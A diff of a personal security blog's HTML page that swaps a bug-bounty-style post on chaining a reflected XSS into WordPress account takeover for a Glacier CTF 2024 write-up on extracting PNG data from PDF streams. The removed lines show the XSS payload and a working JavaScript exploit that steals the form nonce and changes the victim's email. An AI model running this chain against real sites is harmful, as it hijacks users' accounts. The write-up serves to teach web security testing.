@@ -8,14 +8,14 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta http-equiv="X-UA-Compatible" content="ie=edge" />
   
-  <title>Reflected XSS to Account Takeover &middot; &gt;_ majix.site</title>
-  <meta name="title" content="Reflected XSS to Account Takeover &middot; &gt;_ majix.site" />
+  <title>Glacier &middot; &gt;_ majix.site</title>
+  <meta name="title" content="Glacier &middot; &gt;_ majix.site" />
   
-  <meta name="description" content="A reflected XSS bug turns into an ATO due to low security messures" />
-  <meta name="keywords" content="XSS, ATO, Wordpress, " />
+  <meta name="description" content="Glacier CTF 2024 - Majix" />
   
   
-  <link rel="canonical" href="http://localhost:1313/posts/reflected-xss-to-ato/" />
+  
+  <link rel="canonical" href="http://localhost:1313/ctfs/glacier-2024/" />
   
   
   
@@ -69,52 +69,49 @@
   
   
   
-  <meta property="og:url" content="http://localhost:1313/posts/reflected-xss-to-ato/">
+  <meta property="og:url" content="http://localhost:1313/ctfs/glacier-2024/">
   <meta property="og:site_name" content="&gt;_ majix.site">
-  <meta property="og:title" content="Reflected XSS to Account Takeover">
-  <meta property="og:description" content="A reflected XSS bug turns into an ATO due to low security messures">
+  <meta property="og:title" content="Glacier">
+  <meta property="og:description" content="Glacier CTF 2024 - Majix">
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
-    <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2025-02-19T00:00:00+00:00">
-    <meta property="article:modified_time" content="2025-02-19T00:00:00+00:00">
-    <meta property="article:tag" content="XSS">
-    <meta property="article:tag" content="ATO">
-    <meta property="article:tag" content="Wordpress">
-    <meta property="og:image" content="http://localhost:1313/posts/reflected-xss-to-ato/feature.png">
+    <meta property="article:section" content="ctfs">
+    <meta property="article:published_time" content="2024-10-23T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-10-23T00:00:00+00:00">
+    <meta property="og:image" content="http://localhost:1313/ctfs/glacier-2024/feature.svg">
 
   
   <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:image" content="http://localhost:1313/posts/reflected-xss-to-ato/feature.png">
-  <meta name="twitter:title" content="Reflected XSS to Account Takeover">
-  <meta name="twitter:description" content="A reflected XSS bug turns into an ATO due to low security messures">
+  <meta name="twitter:image" content="http://localhost:1313/ctfs/glacier-2024/feature.svg">
+  <meta name="twitter:title" content="Glacier">
+  <meta name="twitter:description" content="Glacier CTF 2024 - Majix">
 
   
   <script type="application/ld+json">
   [{
     "@context": "https://schema.org",
     "@type": "Article",
-    "articleSection": "Posts",
-    "name": "Reflected XSS to Account Takeover",
-    "headline": "Reflected XSS to Account Takeover",
-    "description": "A reflected XSS bug turns into an ATO due to low security messures",
+    "articleSection": "Ctfs",
+    "name": "Glacier",
+    "headline": "Glacier",
+    "description": "Glacier CTF 2024 - Majix",
     
     "inLanguage": "en",
-    "url" : "http:\/\/localhost:1313\/posts\/reflected-xss-to-ato\/",
+    "url" : "http:\/\/localhost:1313\/ctfs\/glacier-2024\/",
     "author" : {
       "@type": "Person",
       "name": "Max"
     },
-    "copyrightYear": "2025",
-    "dateCreated": "2025-02-19T00:00:00\u002b00:00",
-    "datePublished": "2025-02-19T00:00:00\u002b00:00",
+    "copyrightYear": "2024",
+    "dateCreated": "2024-10-23T00:00:00\u002b00:00",
+    "datePublished": "2024-10-23T00:00:00\u002b00:00",
     
-    "dateModified": "2025-02-19T00:00:00\u002b00:00",
+    "dateModified": "2024-10-23T00:00:00\u002b00:00",
     
-    "keywords": ["XSS","ATO","Wordpress"],
+    
     
     "mainEntityOfPage": "true",
-    "wordCount": "478"
+    "wordCount": "308"
   }]
   </script>
 
@@ -485,7 +482,7 @@
 
     
     <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom"
-    style="background-image:url(/posts/reflected-xss-to-ato/feature.png);">
+    style="background-image:url(/ctfs/glacier-2024/feature.svg);">
     
 
 
@@ -529,8 +526,8 @@
   <li class="inline ">
     <a
       class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
-      href="/posts/"
-      >Posts</a
+      href="/ctfs/"
+      >Ctfs</a
     ><span class="px-1 text-primary-500">/</span>
   </li>
 
@@ -538,8 +535,8 @@
   <li class="inline hidden">
     <a
       class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
-      href="/posts/reflected-xss-to-ato/"
-      >Reflected XSS to Account Takeover</a
+      href="/ctfs/glacier-2024/"
+      >Glacier</a
     ><span class="px-1 text-primary-500">/</span>
   </li>
 
@@ -548,7 +545,7 @@
 
     
     <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
-      Reflected XSS to Account Takeover
+      Glacier
     </h1>
     <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
       
@@ -591,7 +588,7 @@
 <div class="flex flex-row flex-wrap items-center">
   
   
-  <time datetime="2025-02-19T00:00:00&#43;00:00">19 February 2025</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">3 mins</span>
+  <time datetime="2024-10-23T00:00:00&#43;00:00">23 October 2024</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">2 mins</span>
   
 
   
@@ -612,32 +609,6 @@
   
   
   
-  
-  
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/xss/&#34;,'_self');return false;">
-    <span class="flex" style="cursor: pointer;">
-  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    XSS
-  </span>
-</span>
-  </span>
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/ato/&#34;,'_self');return false;">
-    <span class="flex" style="cursor: pointer;">
-  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    ATO
-  </span>
-</span>
-  </span>
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/wordpress/&#34;,'_self');return false;">
-    <span class="flex" style="cursor: pointer;">
-  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Wordpress
-  </span>
-</span>
-  </span>
   
   
   
@@ -685,13 +656,11 @@
     class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#i-classfa-solid-fa-bullseyei--the-vulnerabillity"><i class="fa-solid fa-bullseye"></i>  The Vulnerabillity</a>
+    <li><a href="#learnings">Learnings</a>
       <ul>
-        <li><a href="#finding-xss">Finding XSS</a></li>
-        <li><a href="#creating-the-exploit-script">Creating the Exploit Script</a></li>
+        <li><a href="#embedded-png-files-inside-pdf-stream">Embedded PNG files inside PDF stream</a></li>
       </ul>
     </li>
-    <li><a href="#i-classfa-solid-fa-filei-poc"><i class="fa-solid fa-file"></i> PoC</a></li>
   </ul>
 </nav>
   </div>
@@ -705,13 +674,11 @@
     class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#i-classfa-solid-fa-bullseyei--the-vulnerabillity"><i class="fa-solid fa-bullseye"></i>  The Vulnerabillity</a>
+    <li><a href="#learnings">Learnings</a>
       <ul>
-        <li><a href="#finding-xss">Finding XSS</a></li>
-        <li><a href="#creating-the-exploit-script">Creating the Exploit Script</a></li>
+        <li><a href="#embedded-png-files-inside-pdf-stream">Embedded PNG files inside PDF stream</a></li>
       </ul>
     </li>
-    <li><a href="#i-classfa-solid-fa-filei-poc"><i class="fa-solid fa-file"></i> PoC</a></li>
   </ul>
 </nav>
   </div>
@@ -794,98 +761,154 @@
 
         <div class="article-content max-w-prose mb-20">
           <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<h2>🏆  123/798 -- 200 points</h2>
+<table>
+  <thead>
+      <tr>
+          <th><span class="text-primary-400"><strong>Challange</strong></span></th>
+          <th><span class="text-primary-400">Type</span></th>
+          <th><span class="text-primary-400">Points</span></th>
+          <th><span class="text-primary-400">Finished</span></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Fuzzybytes</td>
+          <td>web</td>
+          <td>50</td>
+          <td>November 23rd, 6:56:11 PM</td>
+      </tr>
+      <tr>
+          <td>typstastic</td>
+          <td>misc</td>
+          <td>50</td>
+          <td>November 23rd, 5:19:06 AM</td>
+      </tr>
+      <tr>
+          <td>Rivest–Shamir–Adleman-Germain</td>
+          <td>crypto</td>
+          <td>50</td>
+          <td>November 22nd, 9:04:34 PM</td>
+      </tr>
+      <tr>
+          <td>Welcome</td>
+          <td>welcome</td>
+          <td>50</td>
+          <td>November 22nd, 7:02:16 PM</td>
+      </tr>
+  </tbody>
+</table>
 
 
-<h2 class="relative group"><i class="fa-solid fa-bullseye"></i>  The Vulnerabillity 
-    <div id="i-classfa-solid-fa-bullseyei--the-vulnerabillity" class="anchor"></div>
+<h2 class="relative group">Learnings 
+    <div id="learnings" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#i-classfa-solid-fa-bullseyei--the-vulnerabillity" aria-label="Anchor">#</a>
+            style="text-decoration-line: none !important;" href="#learnings" aria-label="Anchor">#</a>
     </span>        
     
 </h2>
-<p>When researching an application, I noticed that there was a <span class="text-primary-400">feature for resetting the email address</span> of our user. Interestingly, when trying to change it, there was <span class="text-primary-400">no security mechanism verifying that the change was actually initiated by the user</span> of that account. Normally, there’s an extra step where the user must input their password or any other identification method.</p>
-<p>So, the first thing that came to mind was trying to carry out a <span class="text-primary-400">CSRF attack</span>, where I force the user to change their email to mine. This would allow me to use the regular “forgot password” function from the website, then input the email address that was set in the victim’s account, receive the reset email, and change the password to a desired one. However, I quickly realized that <span class="text-primary-400">WordPress securely handled CSRF tokens</span> in this application, so I wasn’t able to take that route yet. The next idea was to <span class="text-primary-400">find an XSS vulnerability</span>, which would allow me to just read those tokens out of the HTML and submit the form with those automatically.</p>
+<hr>
 
 
-<h3 class="relative group">Finding XSS 
-    <div id="finding-xss" class="anchor"></div>
+<h3 class="relative group">Embedded PNG files inside PDF stream 
+    <div id="embedded-png-files-inside-pdf-stream" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#finding-xss" aria-label="Anchor">#</a>
+            style="text-decoration-line: none !important;" href="#embedded-png-files-inside-pdf-stream" aria-label="Anchor">#</a>
     </span>        
     
 </h3>
-<p>Luckily, during my research, I came across a simple reflected XSS in the application: <code>https://example.com/login/confirm_mail.php?email=&lt;img/src/onerror=print()&gt;</code></p>
-
-
-<h3 class="relative group">Creating the Exploit Script 
-    <div id="creating-the-exploit-script" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#creating-the-exploit-script" aria-label="Anchor">#</a>
-    </span>        
-    
-</h3>
-<p>The next step was to create the script that would automatically change the email address in the user’s settings. However, we first have to get the <span class="text-primary-400">nonce that Wordpress added to each form request</span>.</p>
-
-
-<h2 class="relative group"><i class="fa-solid fa-file"></i> PoC 
-    <div id="i-classfa-solid-fa-filei-poc" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#i-classfa-solid-fa-filei-poc" aria-label="Anchor">#</a>
-    </span>        
-    
-</h2>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JS" data-lang="JS"><span class="line"><span class="cl"><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;https://example.com/edit-account/&#39;</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="nx">response</span> <span class="p">=&gt;</span> <span class="nx">response</span><span class="p">.</span><span class="nx">text</span><span class="p">()).</span><span class="nx">then</span><span class="p">(</span><span class="nx">html</span> <span class="p">=&gt;</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="c1">// Fetch the nonce from vulnerable endpoint
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">var</span> <span class="nx">parser</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DOMParser</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">doc</span> <span class="o">=</span> <span class="nx">parser</span><span class="p">.</span><span class="nx">parseFromString</span><span class="p">(</span><span class="nx">html</span><span class="p">,</span> <span class="s1">&#39;text/html&#39;</span><span class="p">);</span>
-</span></span><span class="line hl"><span class="cl">    <span class="kd">var</span> <span class="nx">nonce</span> <span class="o">=</span> <span class="nx">doc</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;save-account-details-nonce&#39;</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">nonce</span><span class="p">);</span>
+<ul>
+<li>
+<p><a href="https://github.com/jesparza/peepdf" target="_blank">peepdf</a> can help to analyze PDF streams</p>
+</li>
+<li>
+<p><a href="https://github.com/WerWolv/ImHex" target="_blank">ImHex</a> is a nice hex editor</p>
+<ul>
+<li>
+<figure>
+      <img class="my-0 rounded-md" src="/images/ctfs/Glacier2024/peepdf.webp" alt="PDF Stream" />
+  
+  
+  </figure></li>
+<li>We can see image data (PNG) is compressed into <code>xref_streams</code></li>
+</ul>
+</li>
+<li>
+<p>Use PyMuPDF library to extract the data</p>
+<ul>
+<li><code>xref_stream()</code> automatically
+<ul>
+<li>Locates the stream in the PDF</li>
+<li>Applies the necessary decompression</li>
+<li>Removes any encoding</li>
+<li>Returns the raw binary data</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><code>xref</code> is just a number</p>
+<ul>
+<li>It&rsquo;s the index or ID of each object in the PDF&rsquo;s cross-reference table</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">xref</span><span class="w">                    </span><span class="c1">// Start of xref table</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">0</span><span class="w"> </span><span class="n">6</span><span class="w">                     </span><span class="c1">// Start at obj 0, contains 6 objects</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">0000000000</span><span class="w"> </span><span class="n">65535</span><span class="w"> </span><span class="n">f</span><span class="w">     </span><span class="c1">// Object 0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">0000000010</span><span class="w"> </span><span class="n">00000</span><span class="w"> </span><span class="n">n</span><span class="w">     </span><span class="c1">// Object 1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">0000000079</span><span class="w"> </span><span class="n">00000</span><span class="w"> </span><span class="n">n</span><span class="w">     </span><span class="c1">// Object 2</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">0000000173</span><span class="w"> </span><span class="n">00000</span><span class="w"> </span><span class="n">n</span><span class="w">     </span><span class="c1">// Object 3</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">0000000301</span><span class="w"> </span><span class="n">00000</span><span class="w"> </span><span class="n">n</span><span class="w">     </span><span class="c1">// Object 4</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">0000000380</span><span class="w"> </span><span class="n">00000</span><span class="w"> </span><span class="n">n</span><span class="w">     </span><span class="c1">// Object 5</span><span class="w">
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># In PDF hex dump</span>
+</span></span><span class="line"><span class="cl">stream
+</span></span><span class="line"><span class="cl">789C636400....  <span class="c1"># This is compressed data</span>
+</span></span><span class="line"><span class="cl">endstream
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="c1">// Change email
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;https://example.com/edit-account/&#39;</span><span class="p">,</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;POST&#39;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="c1">// Include Cookies
-</span></span></span><span class="line hl"><span class="cl"><span class="c1"></span>        <span class="nx">credentials</span><span class="o">:</span> <span class="s1">&#39;include&#39;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">headers</span><span class="o">:</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">            <span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="s1">&#39;application/x-www-form-urlencoded&#39;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="p">},</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">body</span><span class="o">:</span> <span class="sb">`first_name=Test
-</span></span></span><span class="line"><span class="cl"><span class="sb">        &amp;last_name=Test
-</span></span></span><span class="line"><span class="cl"><span class="sb">        &amp;display_name=Test
-</span></span></span><span class="line hl"><span class="cl"><span class="sb">        &amp;email=&lt;email we controll&gt;
-</span></span></span><span class="line"><span class="cl"><span class="sb">        &amp;password_current=
-</span></span></span><span class="line"><span class="cl"><span class="sb">        &amp;password_1=
-</span></span></span><span class="line"><span class="cl"><span class="sb">        &amp;password_2=
-</span></span></span><span class="line hl"><span class="cl"><span class="sb">        &amp;save-account-details-nonce=</span><span class="si">${</span><span class="nx">nonce</span><span class="si">}</span><span class="sb">`</span>
-</span></span><span class="line"><span class="cl">    <span class="p">})</span>
-</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">response</span> <span class="p">=&gt;</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">ok</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;Done!&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;Something went wrong..&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="p">}</span>
-</span></span><span class="line"><span class="cl">    <span class="p">});</span>
-</span></span><span class="line"><span class="cl"><span class="p">});</span></span></span></code></pre></div>
-<p>The password parameters can be left empty, since the application only uses those, when a user wants to change their password via the UI on the website:</p>
-<pre tabindex="0"><code>password_current=
-password_1=
-password_2=
-</code></pre><p><b class="text-primary-400">Explanation</b>: We first send a request to the vulnerable endpoint to retrieve the nonce:
-<code>https://example.com/edit-account/</code>. The response is parsed, and the nonce is extracted from the HTML <code>doc.getElementById('save-account-details-nonce').value</code>. After that, we send a second request to the endpoint where we then fill out the forms details. This request includes the nonce and the attacker’s desired email address. The credentials parameter ensures cookies are included, maintaining the session context.</p>
-<p>With this script in hand we can include it via our reflected XSS <code>https://example.com/login/confirm_mail.php?email={ATTACKER-SCRIPT}</code> and send it to a victim. After the script automatically updates the email address of the victim, we can use the already described way via the password reset function. <span class="text-primary-400">Thus, the account is fully compromised where the victim isn&rsquo;t even able to recover the account, since not only the password but also the email address changed</span>.</p>
-
+</span></span><span class="line"><span class="cl"><span class="c1"># After xref_stream() decoding</span>
+</span></span><span class="line"><span class="cl">89504E470D0A... <span class="c1"># Actual PNG data</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&gt;&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">endobj</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">20</span><span class="w"> </span><span class="n">0</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="c1">// &lt;---- OBJ ID 20</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;&lt;/</span><span class="n">Length</span><span class="w"> </span><span class="n">100</span><span class="o">&gt;&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">stream</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">�</span><span class="n">PNG</span><span class="w"> </span><span class="c1">// &lt;-- PNG starts</span><span class="w">
+</span></span></span></code></pre></div><ul>
+<li>We can then use this script to target the specific stream where the PNG file is via id <code>20</code> and read the raw data from the <code>xref_stream</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">fitz</span>  <span class="c1"># PyMuPDF</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">extract_streams_with_fitz</span><span class="p">(</span><span class="n">pdf_path</span><span class="p">,</span> <span class="n">start_object</span><span class="p">,</span> <span class="n">output_path</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Open the PDF</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pdf_document</span> <span class="o">=</span> <span class="n">fitz</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">pdf_path</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">aggregated_data</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># Iterate through all xref objects starting from the specified one</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">xref</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">start_object</span><span class="p">,</span> <span class="n">pdf_document</span><span class="o">.</span><span class="n">xref_length</span><span class="p">()):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># Get the raw stream data</span>
+</span></span><span class="line"><span class="cl">            <span class="n">stream_data</span> <span class="o">=</span> <span class="n">pdf_document</span><span class="o">.</span><span class="n">xref_stream</span><span class="p">(</span><span class="n">xref</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">stream_data</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">aggregated_data</span> <span class="o">+=</span> <span class="n">stream_data</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Failed to process object </span><span class="si">{</span><span class="n">xref</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">output_path</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">aggregated_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Aggregated PNG data saved to </span><span class="si">{</span><span class="n">output_path</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">extract_streams_with_fitz</span><span class="p">(</span><span class="s2">&#34;chall.pdf&#34;</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="s2">&#34;chall.png&#34;</span><span class="p">)</span>
+</span></span></code></pre></div>
           
           
           
@@ -898,361 +921,6 @@ password_2=
 
         
 
-
-<h2 class="mt-8 text-2xl font-extrabold mb-10">Related</h2>
-<section class="w-full grid gap-4 sm:grid-cols-2 md:grid-cols-3">
-  
-  
-
-  <a href="/posts/intro-to-cache-poisoning/" class="min-w-full">
-    
-    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
-        
-        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/posts/intro-to-cache-poisoning/feature.png);"></div>
-        
-      
-
-      <div class="px-6 py-4">
-
-        
-        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
-          href="/posts/intro-to-cache-poisoning/">Introduction to Cache Poisoning Attacks</div>
-        
-
-        <div class="text-sm text-neutral-500 dark:text-neutral-400">
-          
-
-
-
-
-
-
-
-
-
-
-
-  
-
-
-
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-
-<div class="flex flex-row flex-wrap items-center">
-  
-  
-  <time datetime="2025-02-19T00:00:00&#43;00:00">19 February 2025</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">4 mins</span>
-  
-
-  
-  
-</div>
-
-
-
-
-
-<div class="flex flex-row flex-wrap items-center">
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/cache-poisoning/&#34;,'_self');return false;">
-    <span class="flex" style="cursor: pointer;">
-  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Cache Poisoning
-  </span>
-</span>
-  </span>
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/guide/&#34;,'_self');return false;">
-    <span class="flex" style="cursor: pointer;">
-  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Guide
-  </span>
-</span>
-  </span>
-  
-  
-  
-  
-</div>
-
-
-
-
-        </div>
-
-        
-      </div>
-      <div class="px-6 pt-4 pb-2">
-
-      </div>
-    </div>
-  </a>
-
-  
-  
-
-  <a href="/posts/intro-to-nosql/" class="min-w-full">
-    
-    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
-        
-        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/posts/intro-to-nosql/feature.webp);"></div>
-        
-      
-
-      <div class="px-6 py-4">
-
-        
-        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
-          href="/posts/intro-to-nosql/">Introduction to NoSQL Injection Attacks</div>
-        
-
-        <div class="text-sm text-neutral-500 dark:text-neutral-400">
-          
-
-
-
-
-
-
-
-
-
-
-
-  
-
-
-
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-
-<div class="flex flex-row flex-wrap items-center">
-  
-  
-  <time datetime="2025-02-18T00:00:00&#43;00:00">18 February 2025</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">4 mins</span>
-  
-
-  
-  
-</div>
-
-
-
-
-
-<div class="flex flex-row flex-wrap items-center">
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/nosql/&#34;,'_self');return false;">
-    <span class="flex" style="cursor: pointer;">
-  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    NoSQL
-  </span>
-</span>
-  </span>
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/guide/&#34;,'_self');return false;">
-    <span class="flex" style="cursor: pointer;">
-  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Guide
-  </span>
-</span>
-  </span>
-  
-  
-  
-  
-</div>
-
-
-
-
-        </div>
-
-        
-      </div>
-      <div class="px-6 pt-4 pb-2">
-
-      </div>
-    </div>
-  </a>
-
-  
-  
-
-  <a href="/posts/ble/" class="min-w-full">
-    
-    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
-        
-        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/posts/ble/feature.webp);"></div>
-        
-      
-
-      <div class="px-6 py-4">
-
-        
